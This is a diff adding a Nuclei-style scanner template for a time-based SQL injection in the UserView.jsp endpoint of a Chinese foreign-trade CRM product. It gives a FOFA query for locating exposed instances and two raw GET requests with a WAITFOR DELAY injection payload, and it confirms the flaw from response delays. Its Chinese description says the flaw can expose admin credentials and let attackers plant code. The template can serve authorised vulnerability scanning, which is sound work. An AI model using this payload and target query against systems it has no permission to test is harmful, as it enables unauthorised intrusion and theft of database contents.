@@ -1,0 +1,23 @@
+id: weida-crm-userview-sqli
+info:
+  name: "维达外贸客户关系管理系统 UserView.jsp 接口 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="维达外贸客户关系管理系统"
+          维达外贸客户关系管理系统 UserView.jsp 接口存在可被利用的SQL注入缺陷。攻击者可通过构造恶意SQL查询，绕过身份验证机制，提取数据库敏感数据（如管理员凭证、用户隐私信息）。在具备高权限条件下，可能通过注入命令在服务器写入恶意代码，实现对系统的持久控制。
+  tags: 维达外贸客户关系管理系统
+http:
+- raw:
+  - |
+    GET /wap/common/admin/UserView.jsp?mainid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--%2B HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /wap/common/admin/UserView.jsp?mainid=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27--%2B HTTP/1.1
+    Host: {{Hostname}}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
